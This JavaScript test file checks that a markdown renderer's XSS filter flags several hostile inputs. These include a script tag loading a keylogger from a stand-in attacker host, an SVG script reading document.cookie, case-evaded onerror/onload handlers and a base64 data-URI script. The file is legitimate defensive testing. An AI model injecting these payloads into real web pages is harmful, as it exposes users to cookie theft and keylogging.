import { describe, it, assert } from '../helpers/test-harness.mjs';
import { verifyNoXss } from '../helpers/markdown-test-util.mjs';

describe('Tier 2 - Boundaries: Feature 10 (Adversarial XSS Defense)', () => {
  it('B10.1: Malformed and unclosed script tags are detected and blocked', () => {
    const unclosedScript = '<script src="https://attacker.org/keylogger.js"';
    const check = verifyNoXss(unclosedScript);
    assert.strictEqual(check.safe, false, 'Unclosed script tag must be flagged as unsafe');
  });

  it('B10.2: HTML entity encoded XSS vectors are treated as plain text without execution', () => {
    const encodedPayload = '&lt;script&gt;alert(1)&lt;/script&gt;';
    const check = verifyNoXss(encodedPayload);
    // Encoded entities are safe as long as they aren't decoded into raw HTML tags
    assert.strictEqual(check.safe, true, 'HTML entity-encoded string should not contain raw executable tags');
  });

  it('B10.3: Nested SVG script injection vectors are blocked', () => {
    const nestedSvg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>';
    const check = verifyNoXss(nestedSvg);
    assert.strictEqual(check.safe, false, 'Nested SVG script must be flagged');
  });

  it('B10.4: Event handlers with uppercase or whitespace evasion (ONERROR=, onLOAD  =) are blocked', () => {
    const evadedHandlers = [
      '<img src=x ONERROR=alert(1)>',
      '<img src=x onload = "alert(1)">',
      '<body ONLOAD=alert(1)>',
    ];

    for (const h of evadedHandlers) {
      const check = verifyNoXss(h);
      assert.strictEqual(check.safe, false, `Whitespace or case evaded handler "${h}" must be blocked`);
    }
  });

  it('B10.5: Base64 data URL navigation vectors are neutralized', () => {
    const dataUri = '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>';
    const checkDataUri = (html) => {
      return !/href\s*=\s*['"]?data:text\/html/i.test(html);
    };
    assert.strictEqual(checkDataUri(dataUri), false, 'Data URI execution must be detected and blocked');
  });
});
